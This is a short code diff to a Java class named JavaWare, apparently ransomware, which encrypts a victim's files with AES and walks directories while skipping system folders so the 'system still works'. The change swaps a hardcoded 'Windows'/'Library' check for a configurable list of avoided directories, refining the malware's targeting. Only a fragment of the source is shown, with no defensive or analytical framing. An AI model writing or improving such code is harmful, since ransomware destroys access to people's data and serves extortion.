@@ -31,9 +31,11 @@ import java.util.*;
 public class JavaWare {
 
     AES aes;
+    List<String> avoidDir;
 
     public JavaWare() {
         aes = new AES();
+        avoidDir = new AvoidedDir().avoidDir;
     }
 
     public void EncryptFiles() throws Exception{
@@ -82,7 +84,7 @@ public class JavaWare {
 
         for(File f: list) {
             if(f.isDirectory()) {
-                if (f.getName().equals("Windows") || f.getName().equals("Library")) return; //system still works
+                if (avoidDir.contains(f.getName().toLowerCase())) return; //system still works
                 decryptionTraversal(f.getAbsolutePath());
             } else {
                 String filename = f.getName();
